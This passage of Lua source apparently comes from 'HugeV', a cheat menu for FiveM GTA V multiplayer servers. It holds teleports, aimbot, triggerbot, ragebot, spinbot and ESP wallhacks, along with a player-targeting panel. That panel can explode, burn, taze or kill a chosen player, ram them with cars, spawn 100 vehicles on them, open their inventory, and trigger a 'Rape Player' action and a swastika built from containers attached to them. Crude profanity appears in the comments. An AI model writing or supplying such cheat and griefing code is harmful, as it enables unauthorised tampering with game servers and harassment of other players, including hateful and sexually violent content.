            if SlimButton_antekr5("Sandy Shores", false, 0.51, 0.36) then
                SetEntityCoords(HugeV.Player.PedId, 1176.82, 2657.97, 37.37)
            end
            if SlimButton_antekr5("Burton", false, 0.51, 0.38) then
                SetEntityCoords(HugeV.Player.PedId, -370.53, -130.4, 38.19)
            end
            if SlimButton_antekr5("Little Seoul Car Wash", false, 0.51, 0.4) then
                SetEntityCoords(HugeV.Player.PedId, -701.82, -921.92, 18.58)
            end
            if SlimButton_antekr5("Grand Senora Dust", false, 0.51, 0.42) then
                SetEntityCoords(HugeV.Player.PedId, 1173.45, 2661.58, 37.28)
            end
            -- Ammunation shop's --
            if SlimButton_antekr5("Paleto Bay", false, 0.575, 0.3) then
                SetEntityCoords(HugeV.Player.PedId, -318.85, 6074.43, 30.614)
            end
            if SlimButton_antekr5("Sandy Shores", false, 0.575, 0.32) then
                SetEntityCoords(HugeV.Player.PedId, 1704.67, 3748.88, 33.28)
            end
            if SlimButton_antekr5("Palomino Fwy", false, 0.575, 0.34) then
                SetEntityCoords(HugeV.Player.PedId, 2571.371, 313.879, 107.97)
            end
            if SlimButton_antekr5("Hawick", false, 0.575, 0.36) then
                SetEntityCoords(HugeV.Player.PedId, 235.66, -42.26, 69.22)
            end
            if SlimButton_antekr5("Morningwood", false, 0.575, 0.38) then
                SetEntityCoords(HugeV.Player.PedId, -1108.6, 2685.69, 18.17)
            end
            if SlimButton_antekr5("Little Seoul", false, 0.575, 0.4) then
                SetEntityCoords(HugeV.Player.PedId, -665.232727, -952.522522, 20.866556)
            end
            if SlimButton_antekr5("La Mesa", false, 0.575, 0.42) then
                SetEntityCoords(HugeV.Player.PedId, 844.439026, -1009.422424, 27.511728)
            end
            if SlimButton_antekr5("Cypress Flats", false, 0.575, 0.44) then
                SetEntityCoords(HugeV.Player.PedId, 814.442017, -2130.448486, 28.867798)
            end
            -- Cinemas --
            if SlimButton_antekr5("Vinewood", false, 0.62, 0.3) then
                SetEntityCoords(HugeV.Player.PedId, 814.442017, -2130.448486, 28.867798)
            end
            if SlimButton_antekr5("The Cent", false, 0.62, 0.32) then
                SetEntityCoords(HugeV.Player.PedId, 401.796816, -713.924988, 28.56971)
            end
            if SlimButton_antekr5("Morningwood", false, 0.62, 0.34) then
                SetEntityCoords(HugeV.Player.PedId, -1410.07, -199.047531, 46.5025)
            end
            -- KONIEC CHUJU A TY DODAJ NAPISY :FUCK: -- Wiesz chyba o co mi chodzi <3

            text_szpachlan_szmata("Clothes", false, 0.25, 0, 0.37, 0.49, 4, true)
            DrawRect(0.355, 0.5, 0.012, 0.000925, 255, 255, 255, 255)
            DrawRect(0.385, 0.5, 0.012, 0.000925, 255, 255, 255, 255)

            DrawRect(0.392, 0.395, 0.0006, 0.21, 255, 255, 255, 255)
            DrawRect(0.3485, 0.395, 0.0006, 0.21, 255, 255, 255, 255)

            DrawRect(0.37, 0.29, 0.043, 0.000925, 255, 255, 255, 255)

            ---------------------------------------------------------------

            text_szpachlan_szmata("Barbers", false, 0.25, 0, 0.415, 0.49, 4, true)
            DrawRect(0.4, 0.5, 0.012, 0.000925, 255, 255, 255, 255)
            DrawRect(0.43, 0.5, 0.012, 0.000925, 255, 255, 255, 255)

            DrawRect(0.437, 0.395, 0.0006, 0.21, 255, 255, 255, 255)
            DrawRect(0.3935, 0.395, 0.0006, 0.21, 255, 255, 255, 255)

            DrawRect(0.415, 0.29, 0.043, 0.000925, 255, 255, 255, 255)

            ---------------------------------------------------------------

            text_szpachlan_szmata("Airports", false, 0.25, 0, 0.475, 0.49, 4, true)
            DrawRect(0.455, 0.5, 0.015, 0.000925, 255, 255, 255, 255)
            DrawRect(0.495, 0.5, 0.013, 0.000925, 255, 255, 255, 255)

            DrawRect(0.5006, 0.395, 0.0006, 0.21, 255, 255, 255, 255)
            DrawRect(0.447, 0.395, 0.0006, 0.21, 255, 255, 255, 255)

            DrawRect(0.474, 0.29, 0.053, 0.000925, 255, 255, 255, 255)

            ---------------------------------------------------------------

            text_szpachlan_szmata("Garages", false, 0.25, 0, 0.535, 0.49, 4, true)
            DrawRect(0.355, 0.5, 0.012, 0.000925, 255, 255, 255, 255)
            DrawRect(0.385, 0.5, 0.012, 0.000925, 255, 255, 255, 255)

            DrawRect(0.392, 0.395, 0.0006, 0.21, 255, 255, 255, 255)
            DrawRect(0.3485, 0.395, 0.0006, 0.21, 255, 255, 255, 255)

            DrawRect(0.37, 0.29, 0.043, 0.000925, 255, 255, 255, 255)

            ---------------------------------------------------------------

            text_szpachlan_szmata("Ammunation", false, 0.25, 0, 0.595, 0.49, 4, true)
            DrawRect(0.355, 0.5, 0.012, 0.000925, 255, 255, 255, 255)
            DrawRect(0.385, 0.5, 0.012, 0.000925, 255, 255, 255, 255)

            DrawRect(0.392, 0.395, 0.0006, 0.21, 255, 255, 255, 255)
            DrawRect(0.3485, 0.395, 0.0006, 0.21, 255, 255, 255, 255)

            DrawRect(0.37, 0.29, 0.043, 0.000925, 255, 255, 255, 255)

            ---------------------------------------------------------------

            text_szpachlan_szmata("Cinemas", false, 0.25, 0, 0.64, 0.49, 4, true)
            DrawRect(0.355, 0.5, 0.012, 0.000925, 255, 255, 255, 255)
            DrawRect(0.385, 0.5, 0.012, 0.000925, 255, 255, 255, 255)

            DrawRect(0.392, 0.395, 0.0006, 0.21, 255, 255, 255, 255)
            DrawRect(0.3485, 0.395, 0.0006, 0.21, 255, 255, 255, 255)

            DrawRect(0.37, 0.29, 0.043, 0.000925, 255, 255, 255, 255)
        end
    elseif HugeV.locals.current_tab == "Freecam" then
        if SlimCheckbox("Freecam", 0.36, 0.27, 0.27, HugeV.locals.Freecam) then
            if HugeV.locals.Spectate then
                HugeV.locals.Spectate = false
            end

            if HugeV.locals.CamInVeh then
                HugeV.locals.CamInVeh = false
            end

            HugeV.locals.Freecam = not HugeV.locals.Freecam
        end
    elseif HugeV.locals.current_tab == "Rage" then
        if SlimCheckbox("Spinbot", 0.36, 0.27, 0.27, HugeV.locals.AntiAim) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                HugeV.locals.AntiAim = not HugeV.locals.AntiAim
            end
        end
        if SlimCheckbox("Ragebot", 0.36, 0.29, 0.29, HugeV.locals.RageBot) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                HugeV.locals.RageBot = not HugeV.locals.RageBot
            end
        end
    elseif HugeV.locals.current_tab == "Legit" then
        if HugeV.locals.selected2 == "Aimbot" then
            if SlimCheckbox("Aimbot", 0.36, 0.3, 0.3, HugeV.locals.legit_aimbot) then
                HugeV.locals.legit_aimbot = not HugeV.locals.legit_aimbot
            end

            if SlimCheckbox("Multipoint", 0.36, 0.32, 0.32, multipoint_aimbot) then
                multipoint_aimbot = not multipoint_aimbot
            end

            if multipoint_aimbot then
                drawMultipoint()
            end
        end

        if HugeV.locals.selected2 == "TriggerBot" then
            if SlimCheckbox("TriggerBot", 0.36, 0.3, 0.3, HugeV.locals.TriggerBot) then
                HugeV.locals.TriggerBot = not HugeV.locals.TriggerBot
            end
        end

        if HugeV.locals.selected2 == "Movement" then
            if SlimCheckbox("BunnyHop", 0.36, 0.3, 0.3, HugeV.locals.bunnyhop) then
                HugeV.locals.bunnyhop = not HugeV.locals.bunnyhop
            end

            if SlimCheckbox("Infinite Combat Roll", 0.36, 0.32, 0.32, HugeV.locals.InfiniteCombatRoll) then
                HugeV.locals.InfiniteCombatRoll = not HugeV.locals.InfiniteCombatRoll
            end
        end

        if MenuButton_czlowiek_DS_2("Aimbot", false, 0.35, 0.27) then
            HugeV.locals.selected2 = "Aimbot"
        end

        if MenuButton_czlowiek_DS_2("TriggerBot", false, 0.375, 0.27) then
            HugeV.locals.selected2 = "TriggerBot"
        end

        if MenuButton_czlowiek_DS_2("Movement", false, 0.41, 0.27) then
            HugeV.locals.selected2 = "Movement"
        end
    elseif HugeV.locals.current_tab == "Visual" then
        if SlimCheckbox("ESP ~g~ON", 0.36, 0.27, 0.27, HugeV.locals.esp_switch) then
            HugeV.locals.esp_switch = not HugeV.locals.esp_switch
        end

        if SlimCheckbox("Box", 0.36, 0.29, 0.29, HugeV.locals.esp_box) then
            HugeV.locals.esp_box = not HugeV.locals.esp_box
        end

        if SlimCheckbox("Skeleton", 0.36, 0.31, 0.31, HugeV.locals.esp_skeleton) then
            HugeV.locals.esp_skeleton = not HugeV.locals.esp_skeleton
        end

        if SlimCheckbox("Lines", 0.36, 0.33, 0.33, HugeV.locals.esp_lines) then
            HugeV.locals.esp_lines = not HugeV.locals.esp_lines
        end

        if SlimCheckbox("Info", 0.36, 0.35, 0.35, HugeV.locals.esp_info) then
            HugeV.locals.esp_info = not HugeV.locals.esp_info
        end

        if SlimCheckbox("Player Blips", 0.36, 0.37, 0.37, HugeV.locals.PlayerBlips) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                HugeV.locals.PlayerBlips = not HugeV.locals.PlayerBlips
            end
        end

        if SlimCheckbox("Draw Impact", 0.36, 0.39, 0.39, HugeV.locals.shoot_impact) then
            HugeV.locals.shoot_impact = not HugeV.locals.shoot_impact
        end

        if SlimCheckbox("Trials", 0.36, 0.41, 0.41, HugeV.locals.trials) then
            HugeV.locals.trials = not HugeV.locals.trials
        end

        if SlimCheckbox("Force Radar", 0.36, 0.43, 0.43, HugeV.locals.DisplayRadar) then
            HugeV.locals.DisplayRadar = not HugeV.locals.DisplayRadar
        end

        if SlimCheckbox("Force Third Person", 0.36, 0.45, 0.45, HugeV.locals.force3person) then
            HugeV.locals.force3person = not HugeV.locals.force3person
        end

        if SlimCheckbox("Force Driveby", 0.36, 0.47, 0.47, HugeV.locals.forceDriveBy) then
            HugeV.locals.forceDriveBy = not HugeV.locals.forceDriveBy
        end

        if SlimCheckbox("Crosshair ~g~DOT", 0.36, 0.49, 0.49, HugeV.locals.Celownik1) then
            HugeV.locals.Celownik1 = not HugeV.locals.Celownik1
        end

        if SlimCheckbox("Crosshair ~g~Normal", 0.36, 0.51, 0.51, HugeV.locals.Celownik2) then
            HugeV.locals.Celownik2 = not HugeV.locals.Celownik2
        end
        if SlimCheckbox("Crosshair ~r~PVP", 0.36, 0.53, 0.53, HugeV.locals.CrosshairBetter) then
            HugeV.locals.CrosshairBetter = not HugeV.locals.CrosshairBetter
        end

        if SlimCheckbox("No Fog", 0.36, 0.55, 0.55, HugeV.locals.nofog) then
            HugeV.locals.nofog = not HugeV.locals.nofog
        end
        if SlimCheckbox("Show Coords ~p~NEW", 0.36, 0.57, 0.57, HugeV.locals.ShowCoords) then
            HugeV.locals.ShowCoords = not HugeV.locals.ShowCoords
        end
        if SlimCheckbox("Fake AA ~p~NEW", 0.36, 0.59, 0.59, HugeV.locals.AntiHS_TEST) then
            HugeV.locals.AntiHS_TEST = not HugeV.locals.AntiHS_TEST
        end
        if SlimCheckbox("Heat Vision", 0.36, 0.61, 0.61, HeatVision) then
            HeatVision = not HeatVision
            SetSeethrough(HeatVision)
        end
        if SlimCheckbox("Night Vision", 0.36, 0.63, 0.63, NightVision) then
            NightVision = not NightVision
            SetNightvision(NightVision)
        end
        if SlimCheckbox("4", 0.36, 0.65, 0.65, HugeV.locals.ShowCoords) then
            HugeV.locals.ShowCoords = not HugeV.locals.ShowCoords
        end
        if SlimButton_antekr5("Set Weather EXTRASUNNY", false, 0.66, 0.27) then
            Czitirzen_InvokeNative(0x704983DF373B198F, "EXTRASUNNY") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xED712CA327900C8A, "EXTRASUNNY") -- Ustawianie pogody
            Czitirzen_InvokeNative(0x29B487C359E19889, "EXTRASUNNY") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xA43D5C6FE51ADBEF, "EXTRASUNNY") -- Ustawianie pogody
        end
        if SlimButton_antekr5("Set Weather XMAS", false, 0.66, 0.29) then
            Czitirzen_InvokeNative(0x704983DF373B198F, "XMAS") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xED712CA327900C8A, "XMAS") -- Ustawianie pogody
            Czitirzen_InvokeNative(0x29B487C359E19889, "XMAS") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xA43D5C6FE51ADBEF, "XMAS") -- Ustawianie pogody
        end
        if SlimButton_antekr5("Set Weather FOGGY", false, 0.66, 0.31) then
            Czitirzen_InvokeNative(0x704983DF373B198F, "FOGGY") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xED712CA327900C8A, "FOGGY") -- Ustawianie pogody
            Czitirzen_InvokeNative(0x29B487C359E19889, "FOGGY") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xA43D5C6FE51ADBEF, "FOGGY") -- Ustawianie pogody
        end
        if SlimButton_antekr5("Set Weather SNOWLIGHT", false, 0.66, 0.33) then
            Czitirzen_InvokeNative(0x704983DF373B198F, "SNOWLIGHT") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xED712CA327900C8A, "SNOWLIGHT") -- Ustawianie pogody
            Czitirzen_InvokeNative(0x29B487C359E19889, "SNOWLIGHT") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xA43D5C6FE51ADBEF, "SNOWLIGHT") -- Ustawianie pogody
        end
        if SlimButton_antekr5("Set Weather BLIZZARD", false, 0.66, 0.35) then
            Czitirzen_InvokeNative(0x704983DF373B198F, "BLIZZARD") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xED712CA327900C8A, "BLIZZARD") -- Ustawianie pogody
            Czitirzen_InvokeNative(0x29B487C359E19889, "BLIZZARD") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xA43D5C6FE51ADBEF, "BLIZZARD") -- Ustawianie pogody
        end
        if SlimButton_antekr5("Set Weather CLOUDS", false, 0.66, 0.37) then
            Czitirzen_InvokeNative(0x704983DF373B198F, "CLOUDS") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xED712CA327900C8A, "CLOUDS") -- Ustawianie pogody
            Czitirzen_InvokeNative(0x29B487C359E19889, "CLOUDS") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xA43D5C6FE51ADBEF, "CLOUDS") -- Ustawianie pogody
        end
        if SlimButton_antekr5("Set Weather RAIN", false, 0.66, 0.39) then
            Czitirzen_InvokeNative(0x704983DF373B198F, "RAIN") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xED712CA327900C8A, "RAIN") -- Ustawianie pogody
            Czitirzen_InvokeNative(0x29B487C359E19889, "RAIN") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xA43D5C6FE51ADBEF, "RAIN") -- Ustawianie pogody
        end
        if SlimButton_antekr5("Set Weather SMOG", false, 0.66, 0.41) then
            Czitirzen_InvokeNative(0x704983DF373B198F, "SMOG") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xED712CA327900C8A, "SMOG") -- Ustawianie pogody
            Czitirzen_InvokeNative(0x29B487C359E19889, "SMOG") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xA43D5C6FE51ADBEF, "SMOG") -- Ustawianie pogody
        end
        if SlimButton_antekr5("Set Weather OVERCAST", false, 0.66, 0.43) then
            Czitirzen_InvokeNative(0x704983DF373B198F, "OVERCAST") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xED712CA327900C8A, "OVERCAST") -- Ustawianie pogody
            Czitirzen_InvokeNative(0x29B487C359E19889, "OVERCAST") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xA43D5C6FE51ADBEF, "OVERCAST") -- Ustawianie pogody
        end
        if SlimButton_antekr5("Set Weather CLEAR", false, 0.66, 0.45) then
            Czitirzen_InvokeNative(0x704983DF373B198F, "CLEAR") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xED712CA327900C8A, "CLEAR") -- Ustawianie pogody
            Czitirzen_InvokeNative(0x29B487C359E19889, "CLEAR") -- Ustawianie pogody
            Czitirzen_InvokeNative(0xA43D5C6FE51ADBEF, "CLEAR") -- Ustawianie pogody
        end
    elseif HugeV.locals.current_tab == "Players" then
        -- lewo prawo , wysokosc, cos, szerokosc od gory
        onlineplayers_jgithjtrl("Online Players: " .. #GetActivePlayers(), false, 0.33, 4, 0.356, 0.266) -- jakby oddalanie przblizanie , nic , lewo prawo, gora dol
        onlineplayers_jgithjtrl("Selected Player Information", false, 0.33, 4, 0.49, 0.3)
        if GetPlayerName(HugeV.locals.SelectedPlayer) == GetPlayerName(HugeV.Player.LocalId) then
            onlineplayers_jgithjtrl(
                "Name: " .. GetPlayerName(HugeV.locals.SelectedPlayer) .. " (you)",
                false,
                0.33,
                4,
                0.49,
                0.33
            )
        else
            onlineplayers_jgithjtrl("Name: " .. GetPlayerName(HugeV.locals.SelectedPlayer), false, 0.33, 4, 0.49, 0.33)
        end
        onlineplayers_jgithjtrl(
            "Distance: " ..
                math.round(
                    GetDistanceBetweenCoords(
                        HugeV.functions.getEntityCoords(HugeV.Player.PedId),
                        HugeV.functions.getEntityCoords(GetPlayerPed(HugeV.locals.SelectedPlayer)),
                        true
                    ),
                    1
                ) ..
                    "m",
            false,
            0.33,
            4,
            0.49,
            0.36
        )
        onlineplayers_jgithjtrl(
            "Health: " .. GetEntityHealth(GetPlayerPed(HugeV.locals.SelectedPlayer)),
            false,
            0.33,
            4,
            0.49,
            0.39
        )
        DrawRect(
            0.42,
            0.4,
            0.13,
            0.2,
            HugeV.menu_color.HugeWare_pw.r,
            HugeV.menu_color.HugeWare_pw.g,
            HugeV.menu_color.HugeWare_pw.b,
            150
        )

        if SlimButton_antekr5("Teleport to Player", false, 0.355, 0.53) then
            local entityfdhudfkidfh =
                Czitirzen_InvokeNative(0x997ABD671D25CA0B, Czitirzen_InvokeNative(0xD80958FC74E988A6), false) and
                Czitirzen_InvokeNative(0x6094AD011A2EA87D, Czitirzen_InvokeNative(0xD80958FC74E988A6)) or
                Czitirzen_InvokeNative(0xD80958FC74E988A6)
            Czitirzen_InvokeNative(
                0x06843DA7060A026B,
                entityfdhudfkidfh,
                GetEntityCoords(Czitirzen_InvokeNative(0x43A66C31C68491C0, HugeV.locals.SelectedPlayer)),
                0.0,
                0.0,
                0.0,
                false
            )
        end

        if SlimButton_antekr5("Track Player", false, 0.355, 0.55) then
            local COORDY_XDDXDXDXDX =
                GetEntityCoords(Czitirzen_InvokeNative(0x43A66C31C68491C0, HugeV.locals.SelectedPlayer))
            Czitirzen_InvokeNative(0xFE43368D2AA4F2FC, COORDY_XDDXDXDXDX)
        end
        if SlimButton_antekr5("Clone Outfit", false, 0.355, 0.57) then
            ClonePed_HugeWare_UDYUIGDFGDF(HugeV.locals.SelectedPlayer)
        end

        if SlimButton_antekr5("Molotov Player", false, 0.355, 0.59) then
            if HugeV.locals.peds[1] == HugeV.Player.PedId then
                Czitirzen_InvokeNative(
                    0x172AA1B624FA1013,
                    HugeV.locals.peds[2],
                    GetEntityCoords(Czitirzen_InvokeNative(0x43A66C31C68491C0, HugeV.locals.SelectedPlayer)),
                    3,
                    100000.0,
                    true,
                    false,
                    0
                )
            else
                Czitirzen_InvokeNative(
                    0x172AA1B624FA1013,
                    HugeV.locals.peds[1],
                    GetEntityCoords(Czitirzen_InvokeNative(0x43A66C31C68491C0, HugeV.locals.SelectedPlayer)),
                    3,
                    100000.0,
                    true,
                    false,
                    0
                )
            end
        end
        if SlimButton_antekr5("Taze Player", false, 0.355, 0.61) then
            TazePlayer_GUI_HugeV(HugeV.locals.SelectedPlayer)
        end
        if SlimButton_antekr5("Explode Player", false, 0.355, 0.63) then
            if HugeV.locals.peds[1] == HugeV.Player.PedId then
                Czitirzen_InvokeNative(
                    0x172AA1B624FA1013,
                    HugeV.locals.peds[2],
                    GetEntityCoords(Czitirzen_InvokeNative(0x43A66C31C68491C0, HugeV.locals.SelectedPlayer)),
                    8,
                    100000.0,
                    true,
                    false,
                    0
                )
            else
                Czitirzen_InvokeNative(
                    0x172AA1B624FA1013,
                    HugeV.locals.peds[1],
                    GetEntityCoords(Czitirzen_InvokeNative(0x43A66C31C68491C0, HugeV.locals.SelectedPlayer)),
                    8,
                    100000.0,
                    true,
                    false,
                    0
                )
            end
        end
        if SlimButton_antekr5("Hydrant Player", false, 0.355, 0.65) then
            if HugeV.locals.peds[1] == HugeV.Player.PedId then
                Czitirzen_InvokeNative(
                    0x172AA1B624FA1013,
                    HugeV.locals.peds[2],
                    GetEntityCoords(Czitirzen_InvokeNative(0x43A66C31C68491C0, HugeV.locals.SelectedPlayer)),
                    13,
                    100000.0,
                    true,
                    false,
                    0
                )
            else
                Czitirzen_InvokeNative(
                    0x172AA1B624FA1013,
                    HugeV.locals.peds[1],
                    GetEntityCoords(Czitirzen_InvokeNative(0x43A66C31C68491C0, HugeV.locals.SelectedPlayer)),
                    13,
                    100000.0,
                    true,
                    false,
                    0
                )
            end
        end
        if SlimButton_antekr5("Fire Player", false, 0.355, 0.67) then
            if HugeV.locals.peds[1] == HugeV.Player.PedId then
                Czitirzen_InvokeNative(
                    0x172AA1B624FA1013,
                    HugeV.locals.peds[2],
                    GetEntityCoords(Czitirzen_InvokeNative(0x43A66C31C68491C0, HugeV.locals.SelectedPlayer)),
                    12,
                    100000.0,
                    true,
                    false,
                    0
                )
            else
                Czitirzen_InvokeNative(
                    0x172AA1B624FA1013,
                    HugeV.locals.peds[1],
                    GetEntityCoords(Czitirzen_InvokeNative(0x43A66C31C68491C0, HugeV.locals.SelectedPlayer)),
                    12,
                    100000.0,
                    true,
                    false,
                    0
                )
            end
        end
        if SlimButton_antekr5("Open Inventory Player ~g~ESX", false, 0.355, 0.69) then
            TriggerEvent(
                "esx_inventoryhud:openPlayerInventory",
                GetPlayerId_HugeV_OIDHUFIDSUGLFD(HugeV.locals.SelectedPlayer),
                GetPlayerName(HugeV.locals.SelectedPlayer)
            )
        end
        if SlimButton_antekr5("Rape Player", false, 0.355, 0.71) then
            rape(HugeV.locals.SelectedPlayer)
        end

        if SlimCheckbox("Spectate", 0.50, 0.43, 0.43, HugeV.locals.Spectate) then
            if HugeV.locals.Freecam then
                HugeV.locals.Freecam = false
            end

            if HugeV.locals.CamInVeh then
                HugeV.locals.CamInVeh = false
            end
            z_DSFHSUDGDS = 0.0
            HugeV.locals.Spectate = not HugeV.locals.Spectate
        end

        -------------------------------------------------------------------

        if SlimButton_antekr5("Kick From Vehicle", false, 0.44, 0.53) then
            ClearPedTasksImmediately(GetPlayerPed(HugeV.locals.SelectedPlayer))
        end
        if SlimButton_antekr5("Delete Player Vehicle", false, 0.44, 0.55) then
            DelVeh(HugeV.locals.SelectedPlayer)
        end
        if SlimButton_antekr5("Makes Player Flying Idiot", false, 0.44, 0.57) then
            local hashball = "stt_prop_stunt_soccer_ball"
            while not HasModelLoaded(GetHashKey(hashball)) do
                Citizen.Wait(0)
                RequestModel(GetHashKey(hashball))
            end
            local ball = CreateObject(GetHashKey(hashball), 0, 0, 0, true, true, false)
            SetEntityVisible(ball, 0, 0)
            AttachEntityToEntity(
                ball,
                GetPlayerPed(HugeV.locals.SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(HugeV.locals.SelectedPlayer), 57005),
                0,
                0,
                -1.0,
                0,
                0,
                0,
                false,
                true,
                true,
                true,
                1,
                true
            )
        end
        if SlimButton_antekr5("Give All Weapons to player", false, 0.44, 0.59) then
            for i = 1, #HugeV.locals.AllGuns do
                GiveWeaponToPed(
                    GetPlayerPed(HugeV.locals.SelectedPlayer),
                    GetHashKey("WEAPON_" .. HugeV.locals.AllGuns[i]),
                    1000,
                    false,
                    false
                )
            end
        end
        if SlimButton_antekr5("Remove All Player Weapons", false, 0.44, 0.61) then
            for i = 1, #HugeV.locals.AllGuns do
                RemoveAllPedWeapons(GetPlayerPed(HugeV.locals.SelectedPlayer), true)
            end
        end

        if SlimButton_antekr5("Ram player vehicle", false, 0.44, 0.63) then
            local model = KeyBoardInput_jdhgijslrgeg("Type a name of vehicle", "", 100)
            local hash = GetHashKey(model)
            if IsModelAVehicle(hash) then
                RequestModelSync_SDUFHSIDGSDG(hash)
                local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(HugeV.locals.SelectedPlayer), 0, -10.0, 0)
                local veh =
                    CreateVehicle(
                    hash,
                    offset.x,
                    offset.y,
                    offset.z,
                    GetEntityHeading(GetPlayerPed(HugeV.locals.SelectedPlayer)),
                    true,
                    true
                )
                SetVehicleForwardSpeed(veh, 120.0)
            else
                DebugPrint(model .. " is invalid model", "ERROR")
            end
        end

        if SlimButton_antekr5("Spawn 100 cars on player", false, 0.44, 0.65) then
            local model = KeyBoardInput_jdhgijslrgeg("Type a name of vehicle", "", 100)
            local hash = GetHashKey(model)
            if IsModelAVehicle(hash) then
                RequestModelSync_SDUFHSIDGSDG(hash)
                for i = 0, 100 do
                    local coords = GetEntityCoords(GetPlayerPed(HugeV.locals.SelectedPlayer))
                    CreateVehicle(hash, coords.x, coords.y, coords.z + 1, 0.0, true, true)
                end
            end
        end

        if SlimButton_antekr5("Quick Replacement", false, 0.44, 0.67) then
            QuickReplacement_HugeWare_UDHUKGDFHKDFGDF(HugeV.locals.SelectedPlayer)
        end

        if SlimButton_antekr5("Kill Player", false, 0.44, 0.69) then
            for lolKill = 0, 200 do
                TazePlayer_GUI_HugeV(HugeV.locals.SelectedPlayer)
            end
        end

        if SlimButton_antekr5("Swastika", false, 0.44, 0.71) then
            --[[local swastikalocals = { 
container1 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container2 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container3 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container4 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container5 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container6 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container7 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container8 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container9 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container10 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container11 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container12 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container13 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container14 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container15 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container16 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container17 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container19 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container20 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container21 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container22 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container23 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container24 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container25 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
container26 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
}	--]]
            --                                      BOTTOM LEFT L
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                0,
                0,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                -3.2,
                90,
                0,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                -6.4,
                90,
                0,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                0,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                5.6,
                90,
                0,
                0,
